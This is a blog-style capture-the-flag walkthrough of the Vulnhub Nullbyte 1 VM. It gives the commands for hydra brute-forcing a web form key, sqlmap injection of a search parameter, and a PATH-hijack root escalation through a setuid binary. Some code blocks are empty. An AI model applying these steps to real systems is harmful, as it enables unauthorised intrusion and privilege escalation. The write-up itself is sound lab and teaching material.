title: Nullbyte 1 solution

---

I've been AFK for a while because of various reasons, but now I'm back and have
managed to scrape a little time together to get on with some of [Vulnhub's](https://vulnhub.com)
new VMs. 

So let's start with [Nullbyte 1](https://www.vulnhub.com/entry/nullbyte-1,126/)

# Stage 1

I ran the usual service discovery and found:

{{< highlight bash >}}
root@kali:~# nmap -sV 192.168.56.101

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-08-25 11:29 BST

777/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{{< / highlight >}}

HTTP server on 80 and ssh on 777. I'm going to take the straightforward one, and head
to the HTTP server first.

Upon opening the page I only get an image and some text

{{< figure src="http://i.imgur.com/SlVGKol.png" >}}

I ran `dirbuster` on the root and got a couple of hits: `uploads` and `phpmyadmin`. The first had disabled directory listing
and the second was a no go, but at least told me there was a SQL server available somewhere.

The source of the page doesn't reveal anything else either, so that last place we might be able to find something
is the image itself. There doesn't appear to be any steganography involved here and nothing in the hexdump of the image
either. Well, let me take a look at the EXIF data then.

{{< highlight bash >}}

{{< / highlight >}}

Hrmm, that comment looks unusual. Let's try that in the URL. Initially I got a 404
but that's because I didn't remove the `P-): `. Hitting `http://192.168.56.101/kzMb5nVYJw`
takes me to a form asking for a key.

# Stage 2

Typing in something random just shows `invalid key`. Ok, let me take a look at the source,
see where this thing goes.

{{< highlight html >}}

<center>
<form method="post" action="index.php">
Key:<br>
<input type="password" name="key">
</form> 
</center>
<!-- this form isn't connected to mysql, password ain't that complex --!>
{{< / highlight >}}

Ok, so no SQLi here then, and the password isn't complex either. I'm guessing
a simple wordlist might solve this for me. Time to break out `hydra` for this:

{{< highlight bash >}}
root@kali:~# hydra 192.168.56.101 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l x -P /usr/share/dict/words -t 10 -w 30

{{< / highlight >}}

Bingo. Once I enter that into the field I am able to search for usernames.

# Stage 3

Entering all sorts of names reveals nothing. At this point I am guessing this
is the part that is backed by a SQL database. Although usernames and the usual
SQLi synbols don't do much, entering nothing dumps multiple records. Maybe I will
try to `sqlmap` the URL to see if there's any vulnerabilities there

{{< highlight bash >}}
root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=

<snip>

Result! Using this we can now dump the databasenames, tables, and data in the DB

(output shortened for clarity)
{{< highlight bash >}}

An MD5 hashed password? I best put that through [md5decoder](http://md5decoder.org/) to
be rewarded with the password `omega`

# stage 4

Turns out that this is ramses's password on the ssh service that's running on 
port 777 on the VM. So I'll connect to that and have a look at what's going on there.

Not much in his home directory, so I'll checkout what he's been up to

{{< highlight bash >}}
ramses@NullByte:~$ cat .bash_history 
sudo -s
su eric
exit
ls
clear
cd /var/www
cd backup/
ls
./procwatch 
clear
sudo -s
cd /
ls
exit
{{< / highlight >}}

Interesting, ramses has something in `/var/www`. Seems like a setuid root
binary called `procwatch`. After running it I would assume that it's just running `ps`
to return a list of processes. If I run `ps` on its own, I get the same output (minus
procwatch of course)

So let's see if it calls `ps` with an absolute path, or not. As a quick test I'll create
a symlink to `ls` in the current directory and name it `ps`. Then I set the `PATH` environment variable
with the current dir at the front.

{{< highlight bash >}}
ramses@NullByte:/var/www/backup$ ln -s /bin/ls ps
ramses@NullByte:/var/www/backup$ export PATH=`pwd`:${PATH}
ramses@NullByte:/var/www/backup$ ./procwatch 
ls  procwatch  ps  readme.txt
{{< / highlight >}}

Excellent, it just calls `ps` without a path. A classic issue you can often
find in programs that call other programs.

So let me leverage this to get myself a root shell and ultimately the flag

{{< highlight bash >}}
ramses@NullByte:/var/www/backup$ ln -snf /bin/sh ps
ramses@NullByte:/var/www/backup$ ./procwatch 
# whoami 
root
# cat /root/proof.txt
[OUTPUT CUT]

And that concludes the NullByte VM walkthrough. A nice little machine with some fun
challenges. Thanks to ly0n for creating it.
